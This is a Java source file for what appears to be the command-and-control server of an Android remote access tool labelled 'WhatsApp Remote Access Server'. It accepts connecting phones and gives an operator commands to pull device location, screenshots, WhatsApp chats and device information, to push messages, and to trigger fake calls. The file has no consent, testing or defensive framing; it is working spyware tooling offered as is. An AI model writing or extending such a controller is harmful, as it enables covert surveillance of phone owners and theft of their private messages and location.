import java.io.*;
import java.net.*;
import java.util.*;
import java.util.concurrent.*;

public class WhatsAppServer {
    private static final int PORT = 8080;
    private static Map<String, ClientHandler> clients = new ConcurrentHashMap<>();
    private static Scanner scanner = new Scanner(System.in);
    
    public static void main(String[] args) {
        System.out.println("📱 WhatsApp Remote Access Server Started");
        System.out.println("🖥️  Server IP: 10.0.2.15");
        System.out.println("📍 Port: " + PORT);
        System.out.println("⏳ Waiting for Android devices...\n");
        
        startServer();
        handleAdminCommands();
    }
    
    private static void startServer() {
        new Thread(() -> {
            try (ServerSocket serverSocket = new ServerSocket(PORT)) {
                while (true) {
                    Socket clientSocket = serverSocket.accept();
                    String deviceId = "Device_" + (clients.size() + 1);
                    
                    ClientHandler handler = new ClientHandler(clientSocket, deviceId);
                    clients.put(deviceId, handler);
                    new Thread(handler).start();
                    
                    System.out.println("✅ New Device Connected: " + deviceId);
                    System.out.println("   IP: " + clientSocket.getInetAddress());
                    showConnectedDevices();
                }
            } catch (IOException e) {
                e.printStackTrace();
            }
        }).start();
    }
    
    private static void handleAdminCommands() {
        while (true) {
            System.out.println("\n💬 ** WHATSAPP REMOTE CONTROL **");
            System.out.println("1. list          - Show connected devices");
            System.out.println("2. msg [id] [text] - Send message to device");
            System.out.println("3. call [id]     - Make fake call");
            System.out.println("4. location [id] - Get device location");
            System.out.println("5. screenshot [id] - Capture screen");
            System.out.println("6. whatsapp [id] - Get WhatsApp chats");
            System.out.println("7. info [id]     - Get device information");
            System.out.println("8. broadcast [text] - Send to all devices");
            System.out.println("9. exit          - Shutdown server");
            
            System.out.print("\n👉 Enter command: ");
            String command = scanner.nextLine().trim();
            
            processAdminCommand(command);
        }
    }
    
    private static void processAdminCommand(String command) {
        String[] parts = command.split(" ", 3);
        String cmd = parts[0].toLowerCase();
        
        switch (cmd) {
            case "list":
                showConnectedDevices();
                break;
                
            case "msg":
                if (parts.length >= 3) {
                    sendMessageToDevice(parts[1], parts[2]);
                } else {
                    System.out.println("❌ Usage: msg [device_id] [message]");
                }
                break;
                
            case "call":
                if (parts.length >= 2) {
                    makeFakeCall(parts[1]);
                }
                break;
                
            case "location":
                if (parts.length >= 2) {
                    getDeviceLocation(parts[1]);
                }
                break;
                
            case "screenshot":
                if (parts.length >= 2) {
                    captureScreenshot(parts[1]);
                }
                break;
                
            case "whatsapp":
                if (parts.length >= 2) {
                    getWhatsAppChats(parts[1]);
                }
                break;
                
            case "info":
                if (parts.length >= 2) {
                    getDeviceInfo(parts[1]);
                }
                break;
                
            case "broadcast":
                if (parts.length >= 2) {
                    broadcastMessage(parts[1]);
                }
                break;
                
            case "exit":
                System.out.println("🛑 Shutting down server...");
                System.exit(0);
                break;
                
            default:
                System.out.println("❌ Unknown command");
        }
    }
    
    private static void showConnectedDevices() {
        System.out.println("\n📱 Connected Devices: " + clients.size());
        clients.forEach((id, handler) -> {
            System.out.println("   " + id + " - " + handler.getClientInfo());
        });
    }
    
    private static void sendMessageToDevice(String deviceId, String message) {
        ClientHandler handler = clients.get(deviceId);
        if (handler != null) {
            handler.sendCommand("SHOW_MESSAGE:" + message);
            System.out.println("💬 Message sent to " + deviceId);
        } else {
            System.out.println("❌ Device not found: " + deviceId);
        }
    }
    
    private static void makeFakeCall(String deviceId) {
        ClientHandler handler = clients.get(deviceId);
        if (handler != null) {
            handler.sendCommand("FAKE_CALL:" + "Unknown Number");
            System.out.println("📞 Fake call to " + deviceId);
        }
    }
    
    private static void getDeviceLocation(String deviceId) {
        ClientHandler handler = clients.get(deviceId);
        if (handler != null) {
            handler.sendCommand("GET_LOCATION");
            System.out.println("📍 Requesting location from " + deviceId);
        }
    }
    
    private static void captureScreenshot(String deviceId) {
        ClientHandler handler = clients.get(deviceId);
        if (handler != null) {
            handler.sendCommand("CAPTURE_SCREENSHOT");
            System.out.println("📸 Requesting screenshot from " + deviceId);
        }
    }
    
    private static void getWhatsAppChats(String deviceId) {
        ClientHandler handler = clients.get(deviceId);
        if (handler != null) {
            handler.sendCommand("GET_WHATSAPP_CHATS");
            System.out.println("💬 Requesting WhatsApp chats from " + deviceId);
        }
    }
    
    private static void getDeviceInfo(String deviceId) {
        ClientHandler handler = clients.get(deviceId);
        if (handler != null) {
            handler.sendCommand("GET_DEVICE_INFO");
            System.out.println("📊 Requesting device info from " + deviceId);
        }
    }
    
    private static void broadcastMessage(String message) {
        clients.forEach((id, handler) -> {
            handler.sendCommand("SHOW_MESSAGE:" + message);
        });
        System.out.println("📢 Broadcast sent to all devices");
    }
}

class ClientHandler implements Runnable {
    private Socket socket;
    private PrintWriter out;
    private BufferedReader in;
    private String deviceId;
    private String clientInfo;
    
    public ClientHandler(Socket socket, String deviceId) {
        this.socket = socket;
        this.deviceId = deviceId;
        this.clientInfo = socket.getInetAddress().toString();
    }
    
    @Override
    public void run() {
        try {
            in = new BufferedReader(new InputStreamReader(socket.getInputStream()));
            out = new PrintWriter(socket.getOutputStream(), true);
            
            String message;
            while ((message = in.readLine()) != null) {
                System.out.println("\n📨 From " + deviceId + ": " + message);
                processClientMessage(message);
            }
        } catch (IOException e) {
            System.out.println("❌ Device disconnected: " + deviceId);
        } finally {
            try { socket.close(); } catch (IOException e) {}
        }
    }
    
    private void processClientMessage(String message) {
        if (message.startsWith("LOCATION:")) {
            System.out.println("📍 Location: " + message.substring(9));
        } else if (message.startsWith("DEVICE_INFO:")) {
            System.out.println("📊 Device Info: " + message.substring(12));
        } else if (message.startsWith("SCREENSHOT:")) {
            System.out.println("📸 Screenshot: " + message.substring(11));
        } else if (message.startsWith("WHATSAPP_CHATS:")) {
            System.out.println("💬 WhatsApp Chats:\n" + message.substring(15));
        }
    }
    
    public void sendCommand(String command) {
        if (out != null) {
            out.println(command);
        }
    }
    
    public String getClientInfo() {
        return clientInfo;
    }
}